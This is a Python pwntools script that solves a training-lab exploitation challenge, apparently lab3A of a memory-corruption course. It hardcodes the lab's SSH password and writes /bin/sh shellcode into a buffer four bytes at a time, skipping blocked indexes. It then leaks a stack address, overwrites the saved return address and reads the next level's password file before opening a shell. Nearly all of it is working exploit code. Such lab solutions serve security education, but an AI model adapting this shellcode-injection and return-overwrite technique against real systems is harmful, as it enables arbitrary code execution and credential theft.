#!/usr/bin/env python
from pwn import *

chal = '3A'
password = "wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd"

host = 'exploit-vm'
user = 'lab%s' % chal
level, grade = int(chal[:-1]), chal[-1]
binary = '/levels/lab{:02d}/lab{}'.format(level, chal)

# Over SSH
shell = ssh(host=host, user=user, password=password)
r = shell.run(binary)
r.clean()


def write_4_bytes(r, offset, value):
    """Write integer to offset in the area"""
    r.sendline("store")
    r.sendline(str(util.packing.u32(value)))
    r.sendline(str(offset))

    if not r.recvuntil("Completed store command successfully", timeout=0.1):
        log.warning("Could not store value at %d", offset)
        r.clean_and_log()
        return False
    else:
        log.info("Successfully wrote %d at offset %d", util.packing.u32(value),
                 offset)
        return True


def read_4_bytes(r, offset):
    """Read bytes from memory"""
    r.sendline("read")
    r.sendline(str(offset))

    line = r.recvuntil("Completed read command successfully")
    match = re.search(r"data\[(\d+)\] is (\d+)", line)
    log.info("Successfully read at byte offset %s", offset)
    return int(match.group(2))


# /bin/sh shellcode, with jmps to jump over unwritable memory areas
shellcode = "".join([
    asm("nop")*4,  # NOP for alignment as first 4 bytes are unwritable
    asm("push 0x68"),
    asm("jmp $+2+8") + asm("nop")*8,
    asm("push 0x732f2f2f"),
    asm("jmp $+2+5") + asm("nop")*5,
    asm("push 0x6e69622f"),
    asm("jmp $+2+5") + asm("nop")*5,
    asm("push 0xb"),
    asm("pop eax"),
    asm("mov ebx,esp"),
    asm("jmp $+2+5") + asm("nop")*5,
    asm("xor ecx,ecx"),
    asm("cdq"),
    asm("int 0x80"),
    asm("nop")*3,  # Pad shellcode to a multiple of four
])

# Write shellcode into memory four bytes at a time, skip unwritable areas
log.info("Writing shellcode into memory")
for i in range(0, len(shellcode), 4):
    # Skip over unwritable area of memory
    if (i % 3) == 0:
        continue
    shell_bytes = shellcode[i:i+4]
    log.info("Writing '%s' at %d", shell_bytes.encode("hex"), i/4)
    write_4_bytes(r, i/4, shell_bytes)

log.success("Finished writing shellcode")


rip_offset = 0x6D  # Offset of RIP from buffer: 0x6D * 4 = 1B4 bytes

# Read a stack address to calculate the shellcode's location
stack_ref = read_4_bytes(r, rip_offset+2)  # address 8 bytes before RIP
data_buffer = stack_ref - 0x250
shellcode_address = data_buffer + 0x4  # skip unwritable first 4 bytes
log.success("Found shellcode address: %s", hex(shellcode_address))

# Read original RIP from stack
rip = read_4_bytes(r, rip_offset)
log.info("Original RIP address: %s", hex(rip))

# Overwrite RIP on the stack
write_4_bytes(r, rip_offset, p32(shellcode_address))
new_rip = read_4_bytes(r, rip_offset)
log.success("RIP overwritten, new value: %s", hex(new_rip))

r.sendline("quit")
r.clean(0.1)

log.success("Got a shell!")
r.sendline("cat /home/lab3end/.pass")
log.success("Flag: %s", r.readline())
r.interactive()
